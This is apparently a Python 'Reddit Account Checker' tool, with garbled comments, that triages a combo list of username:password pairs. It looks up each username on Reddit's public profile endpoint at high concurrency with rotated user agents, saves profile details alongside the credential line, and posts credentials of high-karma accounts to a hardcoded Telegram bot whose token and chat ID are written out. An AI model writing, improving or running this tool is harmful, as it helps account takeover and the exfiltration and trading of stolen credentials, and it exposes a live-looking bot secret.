import os
import re
import time
import json
import queue
import threading
import concurrent.futures
from datetime import datetime
from tqdm import tqdm
import requests
import GPUtil
import torch
import aiohttp
import asyncio
import numpy as np

# ???? ????? ???????? ?????????
TELEGRAM_BOT_TOKEN = "8118325105:AAHrZ_ip5UfggrCwilBIPmEYbKdoxs8sZ3s"
TELEGRAM_CHAT_ID = "8176440067"
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

# ===== ??? ?????? ?? GPU/CPU =====
def get_processing_mode():
    """????? ??? ???????? ???????? ????? ??? ???? GPU"""
    try:
        gpus = GPUtil.getGPUs()
        if gpus:
            gpu = gpus[0]
            if gpu.memoryFree > 2000:  # ????? GPU ?????
                return 'gpu'
        if torch.cuda.is_available():
            return 'gpu'
    except:
        pass
    return 'cpu'

# ===== ????? ???? ??????? =====
class FileStreamer:
    """????? ?????? ??????? ????????"""
    def __init__(self, input_file):
        self.input_file = input_file
        self.lock = threading.Lock()
        self.processed = 0
        
    def stream_input(self):
        """????? ????? ????? ?????"""
        with open(self.input_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line:
                    yield line
    
    def write_result(self, filename, content):
        """????? ??????? ?????"""
        with self.lock:
            os.makedirs('result', exist_ok=True)
            with open(os.path.join('result', filename), 'w', encoding='utf-8') as f:
                f.write(content)
            self.processed += 1

# ===== ?????? ???????? =====
def preprocess_line(line):
    """????? ?????? ?? ??? ?????"""
    if not line or ':' not in line:
        return None
        
    username, password = line.split(':', 1)[:2]
    username = username.strip()
    
    # ????? ???????
    if not re.match(r'^[a-zA-Z0-9_-]{3,20}$', username):
        return None
    if len(username) < 6:
        return None
    if len(password) < 8:
        return None
    if any(term in username.lower() for term in {"unknown", "none", "admin", "deleted"}):
        return None
        
    return line

# ===== ????? ????????? =====
async def send_telegram(content):
    """????? ??????? ?? ????? ????????"""
    for attempt in range(5):
        try:
            payload = {
                'chat_id': TELEGRAM_CHAT_ID,
                'text': content,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True
            }
            async with aiohttp.ClientSession() as session:
                async with session.post(TELEGRAM_API_URL, json=payload, timeout=10) as response:
                    if response.status == 200:
                        return True
        except Exception as e:
            await asyncio.sleep(2 ** attempt)
    return False

# ===== ??? ?????? ??????? =====
async def check_user(session, user_agent, line, counters, file_streamer):
    username = line.split(':', 1)[0]
    url = f"https://www.reddit.com/user/{username}/about.json"
    headers = {'User-Agent': user_agent}
    
    try:
        async with session.get(url, headers=headers, timeout=15) as response:
            # ???? ????? (????? ????)
            if response.status == 404:
                with counters['lock']:
                    counters['blacklisted'] += 1
                return
                
            # ???? ????
            if response.status == 200:
                data = await response.json()
                user_data = data.get('data', {})
                
                if not user_data.get('is_suspended', False):
                    # ????? ???????
                    created = datetime.fromtimestamp(user_data.get('created_utc', 0))
                    verified = '? Yes' if user_data.get('verified') else '? No'
                    email_verified = '? Yes' if user_data.get('has_verified_email') else '? No'
                    premium = '? Yes' if user_data.get('is_gold') else '? No'
                    moderator = '? Yes' if user_data.get('is_mod') else '? No'
                    bio = user_data.get('public_description', '') or 'No bio available'
                    
                    content = (
                        f"LOGIN : {line}\n"
                        f"USER: {username} - KARMA : {user_data.get('total_karma', 0)} - "
                        f"{user_data.get('link_karma', 0)} - {user_data.get('comment_karma', 0)}\n"
                        f"Account Created: {created.strftime('%Y-%m-%d')}\n"
                        f"Subreddit: u/{username}\n"
                        f"Verified: {verified}\n"
                        f"Email Verified: {email_verified}\n"
                        f"Premium: {premium}\n"
                        f"Moderator: {moderator}\n"
                        "***********************************************\n"
                        f"BIO: {bio}\n"
                        "***********************************************\n"
                        f"Profile LINK: https://www.reddit.com/user/{username}"
                    )
                    
                    # ??? ?????
                    filename = f"{user_data.get('total_karma', 0)}k_{username}_{created.strftime('%Y-%m-%d')}.txt"
                    file_streamer.write_result(filename, content)
                    
                    # ????? ????????? ??????? ???????
                    if user_data.get('total_karma', 0) > 800:
                        await send_telegram(f"<code>{content}</code>")
                    
                    with counters['lock']:
                        counters['valid'] += 1
                    return
                    
    except Exception as e:
        pass
        
    with counters['lock']:
        counters['failed'] += 1

# ===== ?????? ??????? =====
async def process_batch(lines, mode, counters, file_streamer):
    """?????? ?????? ?? ????????"""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15'
    ]
    
    # ????? ????? ???????
    concurrency = 1000 if mode == 'gpu' else 100
    connector = aiohttp.TCPConnector(limit=concurrency)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for idx, line in enumerate(lines):
            user_agent = np.random.choice(user_agents)
            task = asyncio.create_task(
                check_user(session, user_agent, line, counters, file_streamer)
            )
            tasks.append(task)
        
        await asyncio.gather(*tasks)

# ===== ?????? ???????? =====
def main():
    print("""
    ������+ �������+������+ ������+ ��+��������+
    ��+--��+��+----+��+--��+��+--��+���+--��+--+
    ������++�����+  ���  ������  ������   ���   
    ��+--��+��+--+  ���  ������  ������   ���   
    ���  ����������+������++������++���   ���   
    +-+  +-++------++-----+ +-----+ +-+   +-+   
    Reddit Account Checker v3.0 (GPU/CPU Support)
    """)
    
    # ??? ?????? ???????? ??????
    mode = get_processing_mode()
    print(f"[*] System Detected: Using {'GPU (High Performance)' if mode == 'gpu' else 'CPU (Standard Mode)'}")
    
    # ????? ????? ???????/???????
    input_file = 'usernames.txt'
    file_streamer = FileStreamer(input_file)
    
    # ????? ?????? ????????
    valid_lines = []
    with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
        
    for line in tqdm(lines, desc="Preprocessing Input"):
        processed = preprocess_line(line)
        if processed:
            valid_lines.append(processed)
    
    # ????? ????????
    counters = {
        'total': len(valid_lines),
        'valid': 0,
        'blacklisted': 0,
        'failed': 0,
        'lock': threading.Lock(),
        'start_time': time.time()
    }
    
    # ?????? ????????
    batch_size = 5000
    for i in tqdm(range(0, len(valid_lines), batch_size), 
                  desc="Processing Accounts", unit="batch"):
        batch = valid_lines[i:i+batch_size]
        asyncio.run(process_batch(batch, mode, counters, file_streamer))
        
        # ????? ??????????
        elapsed = time.time() - counters['start_time']
        cpm = int((counters['valid'] + counters['blacklisted'] + counters['failed']) / max(1, elapsed) * 60)
        tqdm.write(f"? Valid: {counters['valid']} | ? Banned: {counters['blacklisted']} | ? Failed: {counters['failed']} | ?? Speed: {cpm} acc/min")
    
    # ??????? ????????
    elapsed = time.time() - counters['start_time']
    print(f"\n{'='*50}")
    print(f"PROCESSING COMPLETED IN {elapsed:.2f} SECONDS")
    print(f"� Valid Accounts: {counters['valid']}")
    print(f"� Banned Accounts: {counters['blacklisted']}")
    print(f"� Failed Checks: {counters['failed']}")
    print(f"� Accounts Saved: {file_streamer.processed}")
    print(f"{'='*50}")

if __name__ == "__main__":
    main()